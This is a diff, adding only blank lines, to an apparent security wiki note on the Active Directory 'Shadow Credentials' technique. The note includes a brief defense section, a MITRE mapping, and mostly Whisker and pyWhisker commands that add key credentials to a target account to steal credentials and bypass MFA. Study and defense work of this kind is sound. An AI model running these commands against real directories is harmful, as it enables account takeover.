@@ -47,11 +47,15 @@ From a technical perspective, an attacker can use Whisker to manage the msDS-Key
 
 From a business perspective, this technique can be used by attackers to gain access to sensitive data or systems, which can lead to data theft or ransomware attacks. It is important for organizations to be aware of this technique and take steps to mitigate the risk of credential theft.
 
+ 
+
 ## Requirements
 
 1. Access to Active Directory
 
 1. Whisker tool
+
+ 
 
 ## Defense
 
@@ -61,11 +65,15 @@ From a business perspective, this technique can be used by attackers to gain acc
 
 1. Implement MFA for all user accounts to reduce the risk of credential theft
 
+ 
+
 ## Objectives
 
 1. Obtain user credentials stored on a Windows 10 device that supports Windows Hello for Business
 
 1. Bypass multi-factor authentication (MFA) and gain access to sensitive data or systems
+
+ 
 
 # Instructions
 
@@ -85,9 +93,17 @@ To remove a key credential from the target object specified by a DeviceID GUID, 
 
 Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
 
+ 
+
+
+
 **Code**: [[# Lists all the entries of the msDS-KeyCredentialL]]
 
+
+
 > This JSON object provides commands to manage the msDS-KeyCredentialLink attribute of the target object using Whisker. The 'list' command is used to list all the entries of the msDS-KeyCredentialLink attribute of the target object. The 'add' command is used to generate a public-private key pair and add a new key credential to the target object as if the user enrolled to WHfB from a new device. The 'remove' command is used to remove a key credential from the target object specified by a DeviceID GUID. The 'instruction' field provides the commands with arguments and the 'explain' field provides a brief explanation of each command.
+
+
 
 **Command** ([[List msDS-KeyCredentialLink attribute entries of target object]]):
 
@@ -95,11 +111,19 @@ Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.
 Whisker.exe list /target:computername$
 ```
 
+
+
+
+
 **Command** ([[Add new key credential to target object]]):
 
 ```bash
 Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
 ```
+
+
+
+
 
 **Command** ([[Add new key credential to target object]]):
 
@@ -107,11 +131,17 @@ Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTR
 Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1]
 ```
 
+
+
+
+
 **Command** ([[Remove key credential from target object]]):
 
 ```bash
 Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
 ```
+
+
 
 2. To list all key credentials associated with the user, use the following command:
 python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
@@ -122,9 +152,17 @@ pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TAR
 To remove a key credential from the user, use the following command:
 python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
 
+ 
+
+
+
 **Code**: [[# Lists all the entries of the msDS-KeyCredentialL]]
 
+
+
 > This command allows you to manage key credentials for Windows Hello for Business. With this command, you can list all the key credentials associated with a user, add a new key credential to a user, and remove a key credential from a user. To use this command, you will need to have pyWhisker installed on your Linux machine. Once installed, you can use the provided commands to manage key credentials for Windows Hello for Business.
+
+
 
 **Command** ([[List all key credentials associated with the specified user]]):
 
@@ -132,17 +170,27 @@ python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target 
 python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
 ```
 
+
+
+
+
 **Command** ([[Add a new key credential to the specified user]]):
 
 ```bash
 pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "add"
 ```
 
+
+
+
+
 **Command** ([[Remove the specified key credential from the specified user]]):
 
 ```bash
 python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -178,3 +226,5 @@ python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target 
 
 - [[Active Directory Attacks]]
 - [[Shadow Credentials]]
+
+
